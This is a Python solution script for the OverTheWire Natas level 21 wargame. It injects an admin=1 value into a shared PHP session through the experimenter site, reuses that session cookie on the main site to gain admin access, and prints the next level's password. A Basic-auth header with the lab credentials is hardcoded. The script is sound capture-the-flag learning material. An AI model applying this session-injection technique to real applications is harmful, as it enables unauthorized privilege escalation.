import requests
from bs4 import BeautifulSoup

# Base URL
url = 'http://natas21-experimenter.natas.labs.overthewire.org/'

# Function to make two GET requests (first one to write to the file, second one - to read)
def send_2_get_requests():
    # Cookies dictionary
    cookies = dict()

    # Our parameters (with name and debug set to whatever)
    params = dict(submit="1", debug="1", admin=1)
    
    headers = {
        'Authorization': 'Basic bmF0YXMyMTo4OU9XclRrR21pTFpMdjEySlk0dExqMmM0RlcweG41Ng==',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'close',
        'Cache-Control': 'max-age=0',
        'Origin': 'http://natas21.natas.labs.overthewire.org',
        'Referer': 'http://natas21.natas.labs.overthewire.org/',
        'Upgrade-Insecure-Requests': '1'
    }

    # Make the GET request with out params (name and debug)
    response_from_write = requests.get(url, headers=headers, params=params, cookies=cookies)

    # Get the PHPSESSID from the response
    phpsessid = response_from_write.cookies['PHPSESSID']

    print(phpsessid)

    # Modify the params to exlude `name` and `admin` parameters
    params = dict(debug="1")

    # Set the PHPSESSID for the next request
    cookies = dict(PHPSESSID=phpsessid)

    # Send request to the first url with modified parameters and PHPSESSID cookie
    response_from_read = requests.get("http://natas21.natas.labs.overthewire.org", headers=headers, params=params, cookies=cookies)
    
    # response_from_read.text contains the HTML content
    html_content = response_from_read.text

    # Parse the HTML content
    soup = BeautifulSoup(html_content, 'html.parser')

    # Find the <pre> tag
    pre_tag = soup.find('pre')

    print(pre_tag.get_text())

send_2_get_requests()
